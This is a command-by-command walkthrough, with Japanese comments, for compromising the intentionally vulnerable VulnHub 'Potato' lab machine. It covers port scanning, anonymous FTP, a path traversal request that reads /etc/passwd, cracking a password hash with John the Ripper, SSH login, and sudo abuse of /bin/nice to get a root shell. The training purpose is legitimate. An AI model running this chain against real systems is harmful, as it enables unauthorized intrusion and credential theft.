# VulnHub: Attack Potato Machine Walkthrough

```bash
# ネットワーク情報の確認
ip a

# IPアドレスを特定
sudo netdiscover -i enp0s3 -r 192.168.56.0/24 

# 環境準備
export IP="192.168.56.102"
echo $IP
mkdir -p vulnhub/potato
cd vulnhub/potato

# ポートスキャン
nmap -sC -sV -Pn -p- $IP -oN portscan_result.txt

# FTP接続とファイル取得
ftp $IP 2112
# ログイン: anonymous / hogehoge
# コマンド:
ls
get welcome.msg
get index.php.bak
exit

# ファイル内容確認
cat welcome.msg
cat index.php.bak

# Webサービス確認
export URL="http://$IP:80"
echo $URL

# ディレクトリ探索
gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt

# ディレクトリトラバーサル攻撃
curl -X POST -b "pass=//password//" -d "file=../../../../../etc/passwd" "$URL" | cat | tr '\0' '\n'

# 結果を保存して解析
cat > pass.txt  # ↑の結果を貼り付け
cat pass.txt | grep -P 'sh$'
cat pass.txt | grep -P 'sh$' | grep webadmin > hash.txt
cat hash.txt

# John the Ripper でハッシュ解析
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hash.txt -show

# SSHログイン
ssh webadmin@$IP
# パスワード: dragon

# ユーザー確認
id
pwd
ls -la

# ユーザーフラグ取得
cat usr.txt
cat usr.txt | base64 -d

# 権限昇格の調査
cd ..
ls
cd florianges
ls -la
sudo -l  # パスワード: dragon

# /bin/nice の挙動確認
ls -la /bin/nice
man /bin/nice

# /notes ディレクトリ探索
cd /notes/
ls -la

# スクリプト実行による権限昇格
sudo /bin/nice /notes/clear.sh
sudo /bin/nice /notes/id.sh
sudo /bin/nice /notes/../bin/bash

# root確認とフラグ取得
id
pwd
ls
cat root.txt
cat root.txt | base64 -d
```
